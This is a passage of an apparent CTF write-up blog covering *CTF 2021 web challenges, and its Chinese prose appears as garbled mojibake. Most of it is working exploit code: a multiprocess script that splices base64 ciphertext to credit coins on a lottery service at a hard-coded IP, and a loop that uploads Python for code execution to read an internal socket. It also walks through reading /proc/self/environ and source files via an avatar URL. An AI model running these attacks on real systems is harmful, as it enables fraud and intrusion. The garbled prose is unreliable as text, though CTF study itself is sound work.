class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, Manager, Value</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://52.149.144.45:8080/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    user = <span class="string">&quot;&quot;</span>.join([random.choice(string.printable) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)])</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;password&quot;</span>: user, <span class="string">&quot;username&quot;</span>: user&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: url, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: url + <span class="string">&quot;index.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    response = session.post(url + <span class="string">&quot;/user/register&quot;</span>, data=paramsPost, headers=headers)</span><br><span class="line">    data = response.content.strip()</span><br><span class="line">    data = json.loads(data)</span><br><span class="line">    uuid = data[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    resp = session.post(url + <span class="string">&quot;/user/login&quot;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: user, <span class="string">&#x27;password&#x27;</span>: user&#125;)</span><br><span class="line">    data = json.loads(resp.content.strip())</span><br><span class="line">    api_token = data[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;api_token&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;uuid&#x27;</span>: uuid, <span class="string">&#x27;api_token&#x27;</span>: api_token&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params">api_token</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;api_token&quot;</span>: api_token&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080/user.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;api_token&quot;</span>: <span class="string">&quot;A1k8zDLeR4lmwwuJaZUgpGRFg9AvT6e2&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://52.149.144.45:8080/lottery/buy&quot;</span>, data=paramsPost, headers=headers, cookies=cookies)</span><br><span class="line">    <span class="keyword">return</span> json.loads(response.content.strip())[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">enc</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsPost = &#123;</span><br><span class="line">        <span class="string">&quot;enc&quot;</span>: enc&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080/lottery.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;api_token&quot;</span>: <span class="string">&quot;A1k8zDLeR4lmwwuJaZUgpGRFg9AvT6e2&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://52.149.144.45:8080/lottery/info&quot;</span>, data=paramsPost, headers=headers, cookies=cookies,</span><br><span class="line">                            proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> json.loads(response.content.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span>(<span class="params">coin, userid, enc</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    paramsPost = &#123;</span><br><span class="line">        <span class="string">&quot;enc&quot;</span>: enc,</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: userid, <span class="string">&quot;coin&quot;</span>: <span class="built_in">str</span>(coin)&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080/lottery.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;api_token&quot;</span>: <span class="string">&quot;A1k8zDLeR4lmwwuJaZUgpGRFg9AvT6e2&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://52.149.144.45:8080/lottery/charge&quot;</span>, data=paramsPost, headers=headers,</span><br><span class="line">                            cookies=cookies, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;[]&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">init_enc, init_info</span>):</span></span><br><span class="line">    userid = init_info[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">    coin = init_info[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;coin&#x27;</span>]</span><br><span class="line">    init_enc = b64decode(init_enc)[<span class="number">32</span>:]</span><br><span class="line">    account = register()</span><br><span class="line">    api_token = account[<span class="string">&#x27;api_token&#x27;</span>]</span><br><span class="line">    enc = buy(api_token)</span><br><span class="line">    exp_enc = b64encode(b64decode(enc)[:<span class="number">64</span>] + init_enc)</span><br><span class="line">    <span class="comment"># print info(exp_enc)</span></span><br><span class="line">    charge(coin, userid, exp_enc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">processPools</span>(<span class="params">init_enc, init_info</span>):</span></span><br><span class="line">    num = <span class="number">10</span></span><br><span class="line">    pool = Pool(processes=num)</span><br><span class="line">    jobs = []</span><br><span class="line">    manager = Manager()</span><br><span class="line">    <span class="built_in">dict</span> = manager.<span class="built_in">dict</span>()</span><br><span class="line">    now_num = manager.<span class="built_in">dict</span>()</span><br><span class="line">    now_num[<span class="string">&quot;num&quot;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">        job = pool.apply_async(attack, (init_enc, init_info))</span><br><span class="line">        jobs.append(job)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    init_account = register()</span><br><span class="line">    api_token = init_account[<span class="string">&#x27;api_token&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;init account api_token&quot;</span>, api_token</span><br><span class="line">    init_enc = buy(api_token)</span><br><span class="line">    <span class="built_in">print</span> init_enc</span><br><span class="line">    init_info = info(init_enc)</span><br><span class="line">    <span class="built_in">print</span> init_info</span><br><span class="line">    processPools(init_enc, init_info)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹¿ç€api_tokenå»ä¹°flagå°±å¥½äº†ï¼š</p><img src="/2021/01/19/2021-starctf/xnx2fpzm0THeHme62EjkDDiBzZdBWkttLwTOTITVUaJFIMQVK5ec1nf6gE3tiHfkIoLgJ61QSXxrN2Q4fJ938er7fhgUkdhPmV3LkiFan8fhVTOQ3TL1ERA3pH-9xGFqBNp7M9BF.png" alt="img" style="zoom:50%;"><h2 id="oh-my-socket"><a href="#oh-my-socket" class="headerlink" title="oh-my-socket"></a>oh-my-socket</h2><p>æˆ‘ä»¬æœ‰webserverçš„shellï¼ˆä¼ ä¸ªpythonéšä¾¿æ‰§è¡Œï¼Œå¯ä»¥å¼¹shellï¼‰ï¼Œç„¶åå¦ä¸€ä¸ªserverå®¹å™¨ç›‘å¬21587ç«¯å£ï¼Œå¦‚æœç»™ä»–å‘*ctfï¼Œå°±æŠŠflagå‘è¿‡æ¥ã€‚</p><p>ä½†æ˜¯ç”±äºè¿™ä¸ªclientè¿ç€serverçš„21587ç«¯å£ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•è¿æ¥ã€‚ã€‚ã€‚</p><p>æœ¬æ¥å†™äº†ä¸ªè„šæœ¬ç›‘è§†å¤§å®¶çš„ expï¼Œä½†æ˜¯ä¸€ä¸‹åˆä¹Ÿæ²¡æŠ„åˆ°ä½œä¸šï¼ˆå¯èƒ½æŠŠ exp ä¼ åˆ°éšç§˜çš„ç›®å½•å»äº†ï¼‰ï¼Œåè€Œè‡ªå·±çš„ç›‘è§†è„šæœ¬è¿˜è¢«åˆ«äººæŠ„äº†23333ã€‚</p><p>ä¸è¿‡çœ‹åˆ°æœ‰äººåœ¨ä¼ªé€ æºåœ°å€å’Œç›®çš„åœ°å€åœ¨å‘ TCP åŒ…ï¼Œè¿˜æœ‰äººä¸€ç›´åœ¨è¯»<code>/proc/&lt;pid&gt;/net/netstat</code>ï¼Œä¹Ÿæ²¡å°è¯•ã€‚ä¹‹åç´¢æ€§å†™äº†ä¸ªè„šæœ¬ï¼Œä¸€ç›´ä¸æ–­è¿æ¥ server çš„21587ç«¯å£ï¼Œå¦‚æœæœ‰äººæŠŠé‚£ä¸ªè¿æ¥æ‰“æ–­äº†ä¹‹ç±»çš„ï¼Œå°±å¯ä»¥é©¬ä¸Šä¸Šè½¦äº†ï¼Œç»“æœå°±å‡ºäº†flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from socket import *</span></span><br><span class="line"><span class="string">try:</span></span><br><span class="line"><span class="string">    tcpSerSock = socket(AF_INET, SOCK_STREAM)</span></span><br><span class="line"><span class="string">    tcpSerSock.connect((&#x27;172.21.0.2&#x27;, 21587))</span></span><br><span class="line"><span class="string">    tcpSerSock.send(b&#x27;*ctf&#x27;)</span></span><br><span class="line"><span class="string">    #tcpSerSock.send(b&#x27;GET /file?name=%2Fproc%2Fself%2Fenviron HTTP/1.1\\r\\n\\r\\n&#x27;)</span></span><br><span class="line"><span class="string">    print(tcpSerSock.recv(1280))</span></span><br><span class="line"><span class="string">except Exception as e:</span></span><br><span class="line"><span class="string">    print(&quot;ERROR&quot;, e)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    paramsMultipart = [(<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;gml.py&#x27;</span>, code, <span class="string">&#x27;application/octet-stream&#x27;</span>))]</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;null&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://101.33.124.168:5001/upload&quot;</span>, files=paramsMultipart, headers=headers,</span><br><span class="line">                            proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;, timeout=<span class="number">4</span>)</span><br><span class="line">        res = response.content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;*ctf&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;success!&quot;</span></span><br><span class="line">            <span class="built_in">print</span> response.content</span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/2021-starctf/owMlBXy5xeDvpNAMdaJa3jpXKqCY4tfXNnI3O2KdT1f54jDZ7MLyPaybcy_IcQqEzI94nPVXYmr90Ne-wo7zI7nL9IdOUT3Imw_0ROCSwTafcf743Syp8uQ7KdpNTLNMdXeiAIuf.png" alt="img"></p><p>é¢„æœŸè§£æ˜¯ä¼ªé€ ä¸€ä¸ªä»serveråˆ°clientçš„RSTï¼Œä»è€Œæ–­å¼€è¿æ¥ï¼Œå¯ä»¥å‚è€ƒ L æˆ˜é˜Ÿå¸ˆå‚…çš„ <a href="https://blog.frankli.site/2021/01/18/*CTF-2021-Web/#oh-my-socket">https://blog.frankli.site/2021/01/18/*CTF-2021-Web/#oh-my-socket</a>ã€‚çœ‹èµ·æ¥æ¯”èµ›çš„æ—¶å€™æˆ‘æŠ„åˆ°äº†çœŸæ­£çš„ expï¼Œåªæ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ 2333ã€‚</p><p>æ²¡æƒ³åˆ°ç»å¸¸å’Œå®éªŒå®¤åˆä½œçš„é’±å¿—äº‘è€å¸ˆ TCP æ”»å‡»çš„è®ºæ–‡ï¼Œè¿˜è¢«ç”¨æ¥å‡º CTF é¢˜äº†ï¼ˆè¿™å°±æ˜¯ç°åœ¨çš„ CTF ä¹ˆ</p><h2 id="oh-my-bet"><a href="#oh-my-bet" class="headerlink" title="oh-my-bet"></a>oh-my-bet</h2><p>èµ›åå¤ç°çš„ï¼Œè¿™é“é¢˜ç®—æ˜¯è¿™æ¬¡æ¯”èµ›è´¨é‡æœ€é«˜çš„ä¸€é“ Webäº†ï¼ˆå”¯ä¸€ä¸€é“ä¼ ç»Ÿ Web</p><p>æ‰“å¼€é¢˜ç›®ä¸€çœ‹ï¼Œæ²¡å•¥å¤ªå¤šæ¥å£å’ŒåŠŸèƒ½ï¼Œæ³¨å†Œçš„æ—¶å€™å¤´åƒå¤„ï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼š</p><p><img src="/2021/01/19/2021-starctf/0ndq9p7isv5O3w-1WnJbJVCmde2o8lyQnIqou7pwcoo6XKIjh6MDvPgc_tPtx-Tns041ivf31RdOhL2KG-XOO74MDYt1uA34dwBAPJd-av6xCFmyk6aejW9NXCS2rIGYcQ-FYTSD.png" alt="img"></p><p>å¸¸è§„å¥—è·¯ï¼Œä¾æ¬¡è¯»å– <code>/proc/self/environ</code>ï¼Œ<code>/proc/self/cmdline</code>ã€‚è¯»å– <code>/app/app.py</code>ï¼Œ<code>/app/utils.py</code>ï¼Œ<code>/app/config.py</code>ã€‚</p><p>å…³é”®çš„ utils.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> exts <span class="keyword">import</span> redis_client</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> session, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> User</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark_data</span>(<span class="params"><span class="built_in">id</span>, data</span>):</span></span><br><span class="line">    expires = <span class="built_in">int</span>(time.time()) + <span class="number">240</span></span><br><span class="line">    p = redis_client.pipeline()</span><br><span class="line">    p.<span class="built_in">set</span>(<span class="built_in">id</span>, data)</span><br><span class="line">    p.expireat(<span class="built_in">id</span>, expires)</span><br><span class="line">    p.execute()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    data = redis_client.get(<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        data = get_avatar(<span class="built_in">id</span>)</span><br><span class="line">        mark_data(<span class="built_in">id</span>, data)</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_required</span>(<span class="params">f</span>):</span></span><br><span class="line"><span class="meta">    @wraps(f)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorated_function</span>(<span class="params">*args, **kws</span>):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;username&quot;</span>):</span><br><span class="line">               <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">            <span class="keyword">return</span> f(*args, **kws)</span><br><span class="line">    <span class="keyword">return</span> decorated_function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_avatar</span>(<span class="params">username</span>):</span></span><br><span class="line"></span><br><span class="line">    dirpath = os.path.dirname(__file__)</span><br><span class="line">    user = User.query.filter_by(username=username).first()</span><br><span class="line"></span><br><span class="line">    avatar = user.avatar</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">&#x27;.+:.+&#x27;</span>, avatar):</span><br><span class="line">        path = avatar</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        path = <span class="string">&#x27;/&#x27;</span>.join([<span class="string">&#x27;file:/&#x27;</span>, dirpath, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;img&#x27;</span>, <span class="string">&#x27;avatar&#x27;</span>, avatar])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content = base64.b64encode(urllib.request.urlopen(path).read())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_path = <span class="string">&#x27;/&#x27;</span>.join([<span class="string">&#x27;file:/&#x27;</span>, dirpath, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;img&#x27;</span>, <span class="string">&#x27;avatar&#x27;</span>, <span class="string">&#x27;error.png&#x27;</span>])</span><br><span class="line">        content = base64.b64encode(urllib.request.urlopen(error_path).read())</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_dice</span>():</span></span><br><span class="line">    dices = [<span class="string">&#x27;1.gif&#x27;</span>, <span class="string">&#x27;2.gif&#x27;</span>, <span class="string">&#x27;3.gif&#x27;</span>, <span class="string">&#x27;4.gif&#x27;</span>, <span class="string">&#x27;5.gif&#x27;</span>, <span class="string">&#x27;6.gif&#x27;</span>, <span class="string">&#x27;surprise1.gif&#x27;</span>, <span class="string">&#x27;surprise2.gif&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> random.choice(dices)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_card</span>():</span></span><br><span class="line">    color = [<span class="string">&#x27;â™ ï¸ï¸&#x27;</span>, <span class="string">&#x27;â¤ï¸ &#x27;</span>, <span class="string">&#x27;ï¸ï¸ğŸ”·&#x27;</span>, <span class="string">&#x27;â™£ï¸&#x27;</span>, <span class="string">&#x27;ğŸš©&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%-5s&quot;</span> % random.choice(color) + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot;%-3s&quot;</span> % <span class="built_in">str</span>(random.randint(<span class="number">1</span>, <span class="number">15</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">data</span>):</span></span><br><span class="line">    m = hashlib.md5(data.encode())</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br></pre></td></tr></table></figure><p>config.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"><span class="keyword">import</span> json</span><br><span 